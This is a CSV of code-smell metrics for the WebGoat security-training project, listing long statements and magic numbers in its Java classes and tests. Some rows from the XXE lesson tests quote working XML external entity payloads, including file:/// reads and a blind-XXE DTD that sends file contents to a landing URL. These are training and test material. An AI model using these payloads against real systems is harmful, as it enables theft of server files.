Project Name,Package Name,Type Name,Method Name,Implementation Smell,Cause of the Smell,Method start line no
WebGoat_WebGoat,org.owasp.webgoat.container.service,LessonMenuServiceTest,lessonsShouldBeOrdered,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.get(URL_LESSONMENU_MVC)).andExpect(status().isOk()).andExpect(jsonPath("$[0].children[0].name"`CoreMatchers.is("AA"))).andExpect(jsonPath("$[0].children[1].name"`CoreMatchers.is("ZA")));" is 225.,72
WebGoat_WebGoat,org.owasp.webgoat.container.service,LessonMenuServiceTest,lessonCompleted,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.get(URL_LESSONMENU_MVC)).andExpect(status().isOk()).andExpect(jsonPath("$[0].children[0].complete"`CoreMatchers.is(true)));" is 162.,90
WebGoat_WebGoat,org.owasp.webgoat.container.service,LessonProgressServiceTest,jsonLessonOverview,Long Statement,The length of the statement "this.mockMvc.perform(MockMvcRequestBuilders.get("/service/lessonoverview.mvc").accept(MediaType.APPLICATION_JSON_VALUE)).andExpect(status().isOk()).andExpect(jsonPath("$[0].assignment.name"`is("test"))).andExpect(jsonPath("$[0].solved"`is(true)));" is 247.,83
WebGoat_WebGoat,org.owasp.webgoat.container.service,HintServiceTest,hintsPerAssignment,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.get(URL_HINTS_MVC)).andExpect(status().isOk()).andExpect(jsonPath("$[0].hint"`CoreMatchers.is("hint 1"))).andExpect(jsonPath("$[0].assignmentPath"`CoreMatchers.is("/HttpBasics/attack1")));" is 227.,39
WebGoat_WebGoat,org.owasp.webgoat.container,LessonTemplateResolver,computeTemplateResource,Long Parameter List,The method has 6 parameters. ,68
WebGoat_WebGoat,org.owasp.webgoat.container,AsciiDoctorTemplateResolver,computeTemplateResource,Long Parameter List,The method has 6 parameters. ,83
WebGoat_WebGoat,org.owasp.webgoat.container,AsciiDoctorTemplateResolver,getInputStream,Long Statement,The length of the statement "if (resourceLoader.getResource("classpath:/" + computeResourceName(templateName`language.getLocale().getLanguage())).isFile()) {" is 128.,104
WebGoat_WebGoat,org.owasp.webgoat.container,AsciiDoctorTemplateResolver,getInputStream,Long Statement,The length of the statement "return resourceLoader.getResource("classpath:/" + computeResourceName(templateName`language.getLocale().getLanguage())).getInputStream();" is 137.,104
WebGoat_WebGoat,org.owasp.webgoat.container,AsciiDoctorTemplateResolver,determineLanguage,Magic Number,The method contains a magic number: 2,132
WebGoat_WebGoat,org.owasp.webgoat.container,AjaxAuthenticationEntryPoint,commence,Magic Number,The method contains a magic number: 401,51
WebGoat_WebGoat,org.owasp.webgoat.container,DatabaseConfiguration,flyWayContainer,Long Statement,The length of the statement "return Flyway.configure().configuration(Map.of("driver"`properties.getDriverClassName())).dataSource(dataSource()).schemas("container").locations("db/container").load();" is 169.,37
WebGoat_WebGoat,org.owasp.webgoat.container,DatabaseConfiguration,flywayLessons,Long Statement,The length of the statement "return schema -> Flyway.configure().configuration(Map.of("driver"`properties.getDriverClassName())).schemas(schema).dataSource(lessonDataSource).locations("lessons").load();" is 173.,53
WebGoat_WebGoat,org.owasp.webgoat.container,LessonDataSource,getConnection,Long Statement,The length of the statement "return (Connection)Proxy.newProxyInstance(ConnectionProxy.class.getClassLoader()`new Class[]{ConnectionProxy.class}`new LessonConnectionInvocationHandler(targetConnection));" is 173.,22
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,lessonThymeleafTemplateResolver,Long Statement,The length of the statement "@Override protected ITemplateResource computeTemplateResource( IEngineConfiguration configuration` String ownerTemplate` String template` String resourceName` String characterEncoding` Map<String`Object> templateResolutionAttributes){" is 234.,96
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,computeTemplateResource,Long Parameter List,The method has 6 parameters. ,104
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,springThymeleafTemplateResolver,Magic Number,The method contains a magic number: 2,117
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,thymeleafTemplateEngine,Long Identifier,The length of the parameter springThymeleafTemplateResolver is 31.,156
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,thymeleafTemplateEngine,Long Identifier,The length of the parameter lessonThymeleafTemplateResolver is 31.,156
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,thymeleafTemplateEngine,Long Statement,The length of the statement "engine.setTemplateResolvers(Set.of(lessonTemplateResolver`asciiDoctorTemplateResolver`lessonThymeleafTemplateResolver`springThymeleafTemplateResolver));" is 152.,156
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,addResourceHandlers,Long Statement,The length of the statement "registry.addResourceHandler("/images/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/images/").toArray(String[]::new));" is 147.,169
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,addResourceHandlers,Long Statement,The length of the statement "registry.addResourceHandler("/lesson_js/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/js/").toArray(String[]::new));" is 146.,169
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,addResourceHandlers,Long Statement,The length of the statement "registry.addResourceHandler("/lesson_css/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/css/").toArray(String[]::new));" is 148.,169
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,addResourceHandlers,Long Statement,The length of the statement "registry.addResourceHandler("/lesson_templates/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/templates/").toArray(String[]::new));" is 160.,169
WebGoat_WebGoat,org.owasp.webgoat.container,MvcConfiguration,addResourceHandlers,Long Statement,The length of the statement "registry.addResourceHandler("/video/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/video/").toArray(String[]::new));" is 145.,169
WebGoat_WebGoat,org.owasp.webgoat.container,WebSecurityConfig,configure,Long Statement,The length of the statement "ExpressionUrlAuthorizationConfigurer<HttpSecurity>.ExpressionInterceptUrlRegistry security=http.authorizeRequests().antMatchers("/css/**"`"/images/**"`"/js/**"`"fonts/**"`"/plugins/**"`"/registration"`"/register.mvc"`"/actuator/**").permitAll().anyRequest().authenticated();" is 274.,59
WebGoat_WebGoat,org.owasp.webgoat.container,WebSecurityConfig,configure,Long Statement,The length of the statement "security.and().formLogin().loginPage("/login").defaultSuccessUrl("/welcome.mvc"`true).usernameParameter("username").passwordParameter("password").permitAll();" is 158.,59
WebGoat_WebGoat,org.owasp.webgoat.container.lessons,CourseConfiguration,createAssignment,Long Statement,The length of the statement "return endpoints.stream().map(e -> new Assignment(e.getClass().getSimpleName()`getPath(e.getClass())`getHints(e.getClass()))).toList();" is 135.,66
WebGoat_WebGoat,org.owasp.webgoat.container.lessons,CourseConfiguration,getPath,Long Statement,The length of the statement "throw new IllegalStateException("Assignment endpoint: " + e + " has no mapping like @GetMapping/@PostMapping etc`"+ "with return type 'AttackResult' or 'ResponseEntity<AttackResult>' please consider adding one");" is 212.,77
WebGoat_WebGoat,org.owasp.webgoat.container.lessons,Assignment,Assignment,Complex Conditional,The conditional expression path.equals("") || path.equals("/") || path.equals("/WebGoat/") is complex.,60
WebGoat_WebGoat,org.owasp.webgoat.container.lessons,Assignment,Assignment,Long Statement,The length of the statement "throw new IllegalStateException("The path of assignment '" + name + "' overrides WebGoat endpoints` please choose a path within the scope of the lesson");" is 154.,60
WebGoat_WebGoat,org.owasp.webgoat.container.i18n,Language,getLocale,Long Statement,The length of the statement "return localeResolver.resolveLocale(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());" is 126.,46
WebGoat_WebGoat,org.owasp.webgoat.container.users,UserTracker,getLessonTracker,Long Statement,The length of the statement "Optional<LessonTracker> lessonTracker=lessonTrackers.stream().filter(l -> l.getLessonName().equals(lesson.getId())).findFirst();" is 128.,64
WebGoat_WebGoat,org.owasp.webgoat.container.users,Scoreboard,challengesSolved,Long Statement,The length of the statement "List<String> challenges=List.of("Challenge1"`"Challenge2"`"Challenge3"`"Challenge4"`"Challenge5"`"Challenge6"`"Challenge7"`"Challenge8"`"Challenge9");" is 150.,54
WebGoat_WebGoat,org.owasp.webgoat.container.users,Scoreboard,challengesSolved,Long Statement,The length of the statement "return challenges.stream().map(userTracker::getLessonTracker).flatMap(Optional::stream).filter(LessonTracker::isLessonSolved).map(LessonTracker::getLessonName).map(this::toLessonTitle).toList();" is 194.,54
WebGoat_WebGoat,org.owasp.webgoat.container.users,Scoreboard,toLessonTitle,Long Statement,The length of the statement "String titleKey=course.getLessons().stream().filter(l -> l.getId().equals(id)).findFirst().map(Lesson::getTitle).orElse("No title");" is 132.,65
WebGoat_WebGoat,org.owasp.webgoat.container.users,UserTrackerRepositoryTest,saveAndLoadShouldHaveCorrectNumberOfAttempts,Magic Number,The method contains a magic number: 4,66
WebGoat_WebGoat,org.owasp.webgoat.container.users,UserServiceTest,shouldThrowExceptionWhenUserIsNotFound,Long Statement,The length of the statement "Assertions.assertThatThrownBy(() -> userService.loadUserByUsername("unknown")).isInstanceOf(UsernameNotFoundException.class);" is 125.,31
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignment,createSecretFileWithRandomContents,Magic Number,The method contains a magic number: 10,64
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignment,checkSolution,Long Statement,The length of the statement "String[] directoriesToCheck=OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;" is 124.,85
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,SimpleXXE,checkSolution,Long Statement,The length of the statement "String[] directoriesToCheck=OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;" is 124.,82
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,CommentsCache,initDefaultComments,Long Statement,The length of the statement "comments.add(new Comment("guest"`LocalDateTime.now().format(fmt)`"I think I will use this picture in one of my projects."));" is 124.,70
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,countComments,Long Statement,The length of the statement "var response=mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON)).andExpect(status().isOk()).andReturn();" is 130.,43
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,containsComment,Long Statement,The length of the statement "mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON)).andExpect(status().isOk()).andExpect(jsonPath("$.[*].text").value(Matchers.hasItem(expected)));" is 173.,50
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,validCommentMustBeAdded,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind").content("<comment><text>test</text></comment>")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("assignment.not.solved"))));" is 230.,56
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,wrongXmlShouldGiveErrorBack,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind").content("<comment><text>test</ext></comment>")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("assignment.not.solved")))).andExpect(jsonPath("$.output"`CoreMatchers.startsWith("javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row`col]:[1`22]\\nMessage:")));" is 432.,67
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,simpleXXEShouldNotWork,Long Statement,The length of the statement "String content="<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///%s\"> ]><comment><text>&root;</text></comment>";" is 154.,77
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,simpleXXEShouldNotWork,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind").content(String.format(content`targetFile.toString()))).andExpect(status().isOk());" is 140.,77
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solve,Long Statement,The length of the statement "String dtd="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n"+ "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"+ port+ "/landing?text=%file;'>\">\n"+ "%all;";" is 236.,87
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solve,Long Statement,The length of the statement "webwolfServer.stubFor(WireMock.get(WireMock.urlMatching("/files/test.dtd")).willReturn(aResponse().withStatus(200).withBody(dtd)));" is 131.,87
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solve,Long Statement,The length of the statement "String xml="<?xml version=\"1.0\"?>" + "<!DOCTYPE comment [" + "<!ENTITY % remote SYSTEM \"http://localhost:" + port + "/files/test.dtd\">"+ "%remote;"+ "]>"+ "<comment><text>test&send;</text></comment>";" is 204.,87
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solve,Magic Number,The method contains a magic number: 200,87
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solve,Magic Number,The method contains a magic number: 200,87
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solveOnlyParamReferenceEntityInExternalDTD,Long Statement,The length of the statement "String dtd="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:" + port + "/landing?text=%file;'>\">\n";" is 158.,111
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solveOnlyParamReferenceEntityInExternalDTD,Long Statement,The length of the statement "webwolfServer.stubFor(WireMock.get(WireMock.urlMatching("/files/test.dtd")).willReturn(aResponse().withStatus(200).withBody(dtd)));" is 131.,111
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solveOnlyParamReferenceEntityInExternalDTD,Long Statement,The length of the statement "String xml="<?xml version=\"1.0\"?>" + "<!DOCTYPE comment [" + "<!ENTITY % file SYSTEM \"" + targetFile.toURI() + "\">\n"+ "<!ENTITY % remote SYSTEM \"http://localhost:"+ port+ "/files/test.dtd\">"+ "%remote;"+ "%all;"+ "]>"+ "<comment><text>test&send;</text></comment>";" is 271.,111
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solveOnlyParamReferenceEntityInExternalDTD,Magic Number,The method contains a magic number: 200,111
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,solveOnlyParamReferenceEntityInExternalDTD,Magic Number,The method contains a magic number: 200,111
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,performXXE,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml)).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("assignment.not.solved"))));" is 195.,135
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,BlindSendFileAssignmentTest,performXXE,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/blind").content("<comment><text>" + text + "</text></comment>")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("assignment.solved"))));" is 234.,135
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignmentTest,sendingXmlButContentTypeIsJson,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type").contentType(MediaType.APPLICATION_JSON).content("<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("xxe.content.type.feedback.json"))));" is 384.,53
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignmentTest,workingAttack,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type").contentType(MediaType.APPLICATION_XML).content("<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM \"file:///\"> ]><comment><text>&root;</text></comment>")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("assignment.solved"))));" is 370.,62
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignmentTest,postingJsonShouldAddComment,Long Statement,The length of the statement "mockMvc.perform(MockMvcRequestBuilders.post("/xxe/content-type").contentType(MediaType.APPLICATION_JSON).content("{ \"text\" : \"Hello World\"}")).andExpect(status().isOk()).andExpect(jsonPath("$.feedback"`CoreMatchers.is(messages.getMessage("xxe.content.type.feedback.json"))));" is 279.,71
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignmentTest,postingJsonShouldAddComment,Long Statement,The length of the statement "mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON)).andExpect(status().isOk()).andExpect(jsonPath("$.[*].text").value(Matchers.hasItem("Hello World")));" is 178.,71
WebGoat_WebGoat,org.owasp.webgoat.lessons.xxe,ContentTypeAssignmentTest,countComments,Long Statement,The length of the statement "var response=mockMvc.perform(get("/xxe/comments").contentType(MediaType.APPLICATION_JSON)).andExpect(status().isOk()).andReturn();" is 130.,84
